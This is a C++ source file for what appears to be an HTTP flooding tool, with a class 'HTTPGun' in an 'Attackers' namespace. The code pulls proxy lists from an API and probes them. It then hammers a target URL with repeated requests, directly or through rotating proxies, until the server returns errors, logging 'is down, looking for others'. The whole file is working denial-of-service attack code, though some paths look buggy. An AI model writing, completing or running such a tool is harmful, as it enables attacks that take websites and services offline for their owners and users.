#include "http_gun.h"

#include "api_interface.h"
#include "utils.h"
#include "config.h"
#include "globals.h"

using namespace Attackers;

std::optional<Proxy> HTTPGun::ChoseProxy(const std::vector<Proxy> &proxies) noexcept
{
	CURLLoader prober;
	Headers headers{CURLLoader::BASE_HEADERS};

	prober.SetTarget(ProxyConfig::PROXY_PROBING);
	for(auto proxy : proxies)
	{
		prober.SetProxy(proxy.first, proxy.second);
		UpdateHeaders(headers, proxy.first);
		prober.SetHeaders(headers);

		if(const auto respCode{prober.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
		{
			if(*respCode >= 200 && *respCode < 300)
			{
				return proxy;
			}
			std::cerr << "Proxy: " << proxy.first << "@" << 
				proxy.second << " failed with code: " << *respCode << std::endl;
		}
		else
		{
			std::cerr << "Proxy: " << proxy.first << "@" << proxy.second << " failed" << std::endl;
		}
	}

	return {};
}

bool HTTPGun::SetValidProxy() noexcept
{
	Informator informer;
	while(!g_shouldStop.load())
	{
		if(!informer.LoadNewData())
		{
			continue;
		}
		if(const auto proxies{informer.GetProxies()})
		{
			if(const auto proxy{ChoseProxy(*proxies)})
			{
				m_currentProxy = std::move(proxy);
				return true;
			}
		}
	}
	return false;
}

std::optional<Target> HTTPGun::Aim(const CURI &uriToAttack) noexcept
{
	CURLLoader prober;
	Headers headers{CURLLoader::BASE_HEADERS};
	// Trying to break through without proxy
	UpdateHeaders(headers, m_currentProxy->first);
	prober.SetHeaders(headers);
	prober.SetTarget(uriToAttack.GetFullURI());

	if(const auto targetRespCode{prober.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS)})
	{
		if(*targetRespCode >= 200 && *targetRespCode < 400)
		{
			std::cout << "Firing without proxy" << std::endl;
			return Target{uriToAttack.GetFullURI(), 0};
		}
		else if(*targetRespCode >= 500)
		{
			return {};
		}
	}

	// Trying to aim with proxy
	if(!SetValidProxy())
	{
		return {};
	}

	UpdateHeaders(headers, m_currentProxy->first);
	prober.SetHeaders(headers);

	prober.SetProxy(m_currentProxy->first, m_currentProxy->second);

	if(const auto targetRespCode{prober.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS)}; 
		*targetRespCode >= 200 && *targetRespCode < 400)
	{
		std::cout << "Firing with proxy" << std::endl;
		return Target{uriToAttack.GetFullURI(), 0};
	}

	return {};
}

void HTTPGun::FireTillDead(const Target &targetToKill) noexcept
{
	if(!m_currentProxy)
	{
		if(AttackWithNoProxy(targetToKill))
		{
			return;
		}
	}

	if(m_currentProxy)
	{
		AttackWithProxy(targetToKill);
	}
	
}

bool HTTPGun::AttackWithNoProxy(const Target &targetToKill) noexcept
{
	Headers headers{CURLLoader::BASE_HEADERS};
	CURLLoader wrapper;

	size_t errorsCount{0};

	while(true)
	{
		UpdateHeaders(headers, m_currentProxy->first);
		wrapper.SetHeaders(headers);

		const auto respCode{wrapper.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS)};
		if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
		{
			return true;
		}
		else if(*respCode >= 200 && *respCode < 300)
		{
			std::cout << "Succesfuly attacked!" << std::endl;
		}
		else if(*respCode >= 400 && *respCode < 500)
		{
			return true;
		}
		else if(*respCode >= 500)
		{
			std::cout << "Target: " << targetToKill.address << " is down, looking for others" << std::endl;
			return false;
		}
	}
}

void HTTPGun::AttackWithProxy(const Target &targetToKill) noexcept
{
	CURLLoader wrapper;
	Informator apiLoader;
	Headers headers{CURLLoader::BASE_HEADERS};

	wrapper.SetTarget(targetToKill.address);

	while(!g_shouldStop.load())
	{
		// Setting proxies
		std::cout << "Setting proxy" << std::endl;
		if(!m_currentProxy && !SetValidProxy())
		{
			return;
		}

		// Attacking
		std::cout << "Attacking" << std::endl;
		size_t errorsCount{0};
		for(size_t currentTry = 0; 
			currentTry < ProxyConfig::MAX_PROXY_ATTACKS; currentTry++)
		{
			UpdateHeaders(headers, m_currentProxy->first);
			wrapper.SetHeaders(headers);

			const auto respCode{wrapper.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS)};
			if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
			{
				return;
			}
			else if(*respCode >= 200 && *respCode < 300)
			{
				std::cout << "Succesfuly attacked!" << std::endl;
			}
			else if(*respCode >= 400 && *respCode < 500)
			{
				break;
			}
			else if(*respCode >= 500)
			{
				std::cout << "Target: " << targetToKill.address << " is down, looking for others" << std::endl;
				return;
			}
		}
		std::cout << "Current proxy exhausted, looking for other" << std::endl;
		m_currentProxy = std::nullopt;
	}

}
